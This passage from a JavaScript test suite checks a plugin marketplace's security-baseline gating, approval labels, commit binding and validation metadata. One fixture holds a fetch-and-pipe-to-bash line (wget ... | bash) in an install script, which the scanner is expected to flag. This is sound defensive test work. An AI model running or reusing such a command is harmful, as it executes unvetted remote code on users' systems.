  assert.equal(securityBaselineEligibleForVerifiedListing(recorded), true);
  assert.equal(securityBaselineEligibleForVerifiedListing(reviewBaseline), true);
  assert.equal(verifiedPublicationDisposition(recorded), "clear");
  assert.equal(verifiedPublicationDisposition(reviewBaseline), "review-required");
  assert.doesNotThrow(() => assertApprovalAllowed(
    { labels: ["validated", "security-review-required"] },
    reviewBaseline,
    { commitSha: commit },
    "https://github.com/example/plugin",
  ));
  assert.throws(
    () => checkBlockingLabels(["validated", "needs-fixes"]),
    (error) => error.code === "approval-blocking-label",
  );
  assert.throws(
    () => checkCommitBinding(commit, otherCommit),
    (error) => error.code === "approval-upstream-changed",
  );
  assert.throws(
    () => assertApprovalAllowed({ labels: [] }, null, { commitSha: commit }, "https://github.com/example/plugin"),
    (error) => error.code === "approval-security-baseline-missing",
  );

  const reviewOnlyFinding = parseSecurityBaselineMarker(serializeSecurityBaselineMarker(baseline([
    file("install.sh", "wget -qO- https://example.test/install | bash"),
  ])));
  assert.equal(securityBaselineEligibleForVerifiedListing(reviewOnlyFinding), true);
  assert.equal(verifiedPublicationDisposition(reviewOnlyFinding), "review-required");
  assert.doesNotThrow(() => assertApprovalAllowed(
    { labels: ["security-review-required"] },
    reviewOnlyFinding,
    { commitSha: commit },
    "https://github.com/example/plugin",
  ));
  const blockingFinding = parseSecurityBaselineMarker(serializeSecurityBaselineMarker({
    baselineVersion: "3",
    repository: "example/plugin",
    commitSha: commit,
    checkedAt,
    outcome: "needs-fixes",
    enforcementMode: "selective",
    findings: ["sudoers-dangerous-passwordless-command"],
    capabilities: [],
    pluginIds: ["example.plugin"],
  }));
  assert.equal(securityBaselineEligibleForVerifiedListing(blockingFinding), false);
  assert.equal(verifiedPublicationDisposition(blockingFinding), "needs-fixes");
  assert.throws(
    () => assertApprovalAllowed(
      { labels: ["security-needs-fixes"] },
      blockingFinding,
      { commitSha: commit },
      "https://github.com/example/plugin",
    ),
    (error) => error.code === "approval-blocking-label",
  );
});

test("validation metadata preserves the exact full commit for the baseline", async () => {
  const directory = await mkdtemp(join(tmpdir(), "marketplace-validation-"));
  const path = join(directory, "metadata.json");
  try {
    await writeValidationMetadata(path, "https://github.com/example/plugin", {
      repository: "example/plugin",
      defaultBranch: "main",
      commitSha: commit,
      manifests: [{
        id: "example.plugin",
        path: "manifest.json",
        entryPoints: ["dist/runtime.js", "Service.qml"],
      }],
    });
    assert.deepEqual(JSON.parse(await readFile(path, "utf8")), {
      schemaVersion: 1,
      repoUrl: "https://github.com/example/plugin",
      repository: "example/plugin",
      defaultBranch: "main",
      commitSha: commit,
      pluginIds: ["example.plugin"],
      listedPlugins: [{
        pluginId: "example.plugin",
        manifestPathHint: "manifest.json",
      }],
      entryPoints: ["Service.qml", "dist/runtime.js"],
    });
  } finally {
    await rm(directory, { recursive: true, force: true });
  }
});
